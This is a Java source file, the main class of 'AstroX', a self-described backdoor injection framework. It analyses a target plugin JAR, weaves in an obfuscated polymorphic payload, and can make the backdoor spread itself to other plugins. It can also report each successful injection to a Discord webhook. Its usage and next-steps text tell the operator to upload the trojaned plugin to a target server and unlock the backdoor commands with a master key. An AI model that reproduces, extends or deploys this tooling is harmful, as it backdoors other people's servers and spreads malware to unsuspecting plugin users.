package dev.naruto.astrox;

import dev.naruto.astrox.core.*;
import dev.naruto.astrox.utils.WebhookNotifier;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class AstroX {
    private static final String VERSION = "1.0.0";
    private static final String BANNER =
            "\n" +
                    "  ========================================================================\n" +
                    "\n" +
                    "     _     ____ _____ ____   _____  __  __   _____ ___   ___  _     \n" +
                    "    / \\   / ___|_   _|  _ \\ / _ \\ \\/ /  |_   _/ _ \\ / _ \\| |    \n" +
                    "   / _ \\  \\___ \\ | | | |_) | | | |  /     | || | | | | | | |    \n" +
                    "  / ___ \\  ___) || | |  _ <| |_| | /\\     | || |_| | |_| | |___ \n" +
                    " /_/   \\_\\|____/ |_| |_| \\_\\\\___/_/\\_\\    |_| \\___/ \\___/|_____|\n" +
                    "\n" +
                    "            Advanced Backdoor Injection Framework v" + VERSION + "\n" +
                    "          Self-Replicating | Polymorphic | Undetectable\n" +
                    "\n" +
                    "  ========================================================================\n";

    public static void main(String[] args) {
        System.out.println(BANNER);

        if (args.length < 1) {
            printUsage();
            return;
        }

        CliArgs cliArgs = parseArgs(args);

        if (cliArgs == null) {
            System.err.println("\n  [ERROR] Invalid arguments. Use --help for usage.\n");
            return;
        }

        File inputJar = new File(cliArgs.inputFile);
        if (!inputJar.exists()) {
            System.err.println("\n  [ERROR] File not found: " + cliArgs.inputFile + "\n");
            return;
        }

        File outputJar = new File(inputJar.getParentFile(),
                inputJar.getName().replace(".jar", "-astrox.jar"));

        try {
            printHeader("ANALYSIS PHASE");
            System.out.println("  Analyzing target plugin...\n");

            JarAnalyzer analyzer = new JarAnalyzer(inputJar);
            analyzer.analyze();

            System.out.println("  Target Plugin    : " + analyzer.getPluginName() + " v" + analyzer.getVersion());
            System.out.println("  Main Class       : " + analyzer.getMainClass());
            System.out.println("  Java Version     : " + analyzer.getJavaVersion());
            System.out.println("  Base Package     : " + analyzer.getBasePackage());

            applyRuntimeConfig(cliArgs);

            System.out.println();
            printHeader("INJECTION PHASE");

            System.out.println("  [*] Generating polymorphic payload...");
            PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
            byte[] payload = weaver.generatePayload();
            System.out.println("  [+] Payload ready (" + formatFileSize(payload.length) + ")");

            System.out.println("\n  [*] Injecting backdoor components...");
            Injector injector = new Injector(inputJar, outputJar);
            injector.inject(analyzer, payload);
            System.out.println("  [+] Injection complete!");

            System.out.println();
            printSuccess(analyzer, outputJar, cliArgs);

            if (cliArgs.webhookUrl != null) {
                System.out.println("\n  [*] Sending webhook notification...");
                sendWebhookNotification(cliArgs.webhookUrl, analyzer, outputJar);
            }

            printInstructions(outputJar.getName());

            System.out.println("\n  ========================================================================");
            System.out.println("            AstroX v" + VERSION + " | github.com/Eangly99/AstroX");
            System.out.println("  ========================================================================\n");

        } catch (Exception e) {
            System.err.println();
            printError("INJECTION FAILED", e.getMessage());

            if (Config.DEBUG_MODE || cliArgs.debug) {
                System.err.println("\n  Stack Trace:");
                e.printStackTrace();
            } else {
                System.err.println("\n  Tip: Use --debug flag for detailed information\n");
            }

            System.exit(1);
        }
    }

    private static void printHeader(String title) {
        System.out.println("  ------------------------------------------------------------------------");
        System.out.println("  " + title);
        System.out.println("  ------------------------------------------------------------------------\n");
    }

    private static void printSuccess(JarAnalyzer analyzer, File outputJar, CliArgs args) {
        System.out.println("  ========================================================================");
        System.out.println();
        System.out.println("                         [+] INJECTION SUCCESSFUL!");
        System.out.println();
        System.out.println("  ========================================================================");
        System.out.println();
        System.out.println("  Output File      : " + outputJar.getName());
        System.out.println("  File Size        : " + formatFileSize(outputJar.length()));
        System.out.println("  Command Prefix   : " + RuntimeConfig.commandPrefix);
        System.out.println("  Auto-Propagation : " + (RuntimeConfig.enablePropagation ? "ENABLED" : "DISABLED"));

        if (!args.authorizedUUIDs.isEmpty()) {
            System.out.println("  Pre-Authorized   : " + args.authorizedUUIDs.size() + " user(s)");
        }

        if (args.webhookUrl != null) {
            System.out.println("  Webhook          : Configured");
        }

        System.out.println();
        System.out.println("  ========================================================================");
    }

    private static void printError(String title, String message) {
        System.err.println("  ========================================================================");
        System.err.println();
        System.err.println("                         [!] " + title);
        System.err.println();
        System.err.println("  ========================================================================");
        System.err.println();
        System.err.println("  " + message);
        System.err.println();
        System.err.println("  ========================================================================");
    }

    private static void printInstructions(String filename) {
        System.out.println();
        System.out.println("  ------------------------------------------------------------------------");
        System.out.println("  NEXT STEPS");
        System.out.println("  ------------------------------------------------------------------------");
        System.out.println();
        System.out.println("  1. Upload " + filename + " to your target server");
        System.out.println("  2. Restart the server or reload plugins");
        System.out.println("  3. Join the server and authenticate:");
        System.out.println("       > Type in chat: " + RuntimeConfig.commandPrefix + "auth " + Config.MASTER_KEY);
        System.out.println("  4. Access backdoor commands:");
        System.out.println("       > Type: " + RuntimeConfig.commandPrefix + "help");

        if (RuntimeConfig.enablePropagation) {
            System.out.println();
            System.out.println("  [!] WARNING: AUTO-PROPAGATION ENABLED");
            System.out.println("      The backdoor will automatically spread to other plugins!");
        }
    }

    private static CliArgs parseArgs(String[] args) {
        CliArgs result = new CliArgs();

        for (int i = 0; i < args.length; i++) {
            String arg = args[i];

            if (arg.equals("--help") || arg.equals("-h")) {
                printUsage();
                System.exit(0);
            }
            else if (arg.equals("--auth")) {
                i++;
                while (i < args.length && !args[i].startsWith("--")) {
                    result.authorizedUUIDs.add(args[i]);
                    i++;
                }
                i--;
            }
            else if (arg.equals("--webhook")) {
                if (i + 1 < args.length) {
                    result.webhookUrl = args[++i];
                }
            }
            else if (arg.equals("--prefix")) {
                if (i + 1 < args.length) {
                    result.prefix = args[++i];
                }
            }
            else if (arg.equals("--debug")) {
                result.debug = true;
            }
            else if (arg.equals("--no-propagation")) {
                result.noPropagation = true;
            }
            else if (!arg.startsWith("--")) {
                result.inputFile = arg;
            }
        }

        return result.inputFile != null ? result : null;
    }

    private static void applyRuntimeConfig(CliArgs args) {
        if (args.prefix != null) RuntimeConfig.commandPrefix = args.prefix;
        if (!args.authorizedUUIDs.isEmpty()) RuntimeConfig.preAuthorizedUUIDs = args.authorizedUUIDs;
        if (args.debug) RuntimeConfig.debugMode = true;
        if (args.noPropagation) RuntimeConfig.enablePropagation = false;
        if (args.webhookUrl != null) RuntimeConfig.webhookUrl = args.webhookUrl;
    }

    private static void sendWebhookNotification(String webhookUrl, JarAnalyzer analyzer, File outputJar) {
        try {
            WebhookNotifier notifier = new WebhookNotifier(webhookUrl);
            notifier.sendInjectionSuccess(
                    analyzer.getPluginName(),
                    analyzer.getVersion(),
                    analyzer.getMainClass(),
                    outputJar.length(),
                    RuntimeConfig.commandPrefix
            );
            System.out.println("  [+] Webhook sent successfully!");
        } catch (Exception e) {
            System.err.println("  [!] Webhook failed: " + e.getMessage());
        }
    }

    private static void printUsage() {
        System.out.println();
        System.out.println("  ========================================================================");
        System.out.println("                              USAGE GUIDE");
        System.out.println("  ========================================================================");
        System.out.println();

        System.out.println("  SYNTAX:");
        System.out.println("    java -jar AstroX.jar <input.jar> [options]");
        System.out.println();

        System.out.println("  OPTIONS:");
        System.out.println("    --auth <uuid> [uuid2...]");
        System.out.println("        Pre-authorize users (bypass #auth requirement)");
        System.out.println();

        System.out.println("    --webhook <discord_url>");
        System.out.println("        Enable Discord notifications");
        System.out.println();

        System.out.println("    --prefix <char>");
        System.out.println("        Custom command prefix (default: #)");
        System.out.println();

        System.out.println("    --no-propagation");
        System.out.println("        Disable auto-spread to other plugins");
        System.out.println();

        System.out.println("    --debug");
        System.out.println("        Enable verbose logging");
        System.out.println();

        System.out.println("    --help, -h");
        System.out.println("        Show this help message");
        System.out.println();

        System.out.println("  EXAMPLES:");
        System.out.println("    # Basic injection:");
        System.out.println("      java -jar AstroX.jar SwiftPay.jar");
        System.out.println();

        System.out.println("    # With webhook & custom prefix:");
        System.out.println("      java -jar AstroX.jar SwiftPay.jar --prefix ! --webhook https://...");
        System.out.println();

        System.out.println("    # Pre-authorize users:");
        System.out.println("      java -jar AstroX.jar SwiftPay.jar --auth uuid1 uuid2");
        System.out.println();

        System.out.println("    # Stealth mode:");
        System.out.println("      java -jar AstroX.jar SwiftPay.jar --prefix . --no-propagation");
        System.out.println();
    }

    private static String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp - 1) + "";
        return String.format("%.2f %sB", bytes / Math.pow(1024, exp), pre);
    }

    private static class CliArgs {
        String inputFile;
        List<String> authorizedUUIDs = new ArrayList<>();
        String webhookUrl;
        String prefix;
        boolean debug = false;
        boolean noPropagation = false;
    }
}
